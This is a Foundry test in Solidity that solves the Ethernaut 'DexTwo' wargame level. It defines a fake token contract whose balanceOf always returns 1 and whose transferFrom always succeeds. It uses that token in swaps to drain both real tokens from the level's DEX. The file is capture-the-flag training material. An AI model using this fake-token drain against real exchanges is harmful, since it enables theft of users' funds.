// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "levels/DexTwo/DexTwo.sol";
import "levels/DexTwo/DexTwoFactory.sol";
import "./utils/EthernautTest.sol";

contract DexHack {
    DexTwo public victim;

    constructor(address _targetAddress) {
        victim = DexTwo(_targetAddress);
    }

    function balanceOf(address _address) public view returns (uint256 balance) {
        balance = 1;
    }

    function transferFrom(address from, address to, uint256 amount) public returns (bool) {
        return true;
    }

    function exploit() external {
        victim.swap(address(this), victim.token1(), 1);
        victim.swap(address(this), victim.token2(), 1);
    }
}

contract DexTest is Test {
    function test_dextwo() external {
        // Setup
        EthernautTest ethernautTest = new EthernautTest();
        DexTwoFactory dexFactory = new DexTwoFactory();
        address levelAddress = ethernautTest.setup(dexFactory);
        DexTwo dexContract = DexTwo(levelAddress);

        // Exploit
        vm.startPrank(tx.origin);
        DexHack dexHack = new DexHack(levelAddress);
        IERC20(dexContract.token1()).transfer(address(dexHack), IERC20(dexContract.token1()).balanceOf(tx.origin));
        IERC20(dexContract.token2()).transfer(address(dexHack), IERC20(dexContract.token2()).balanceOf(tx.origin));
        dexHack.exploit();
        vm.stopPrank();

        // Submit
        ethernautTest.submit();
    }
}
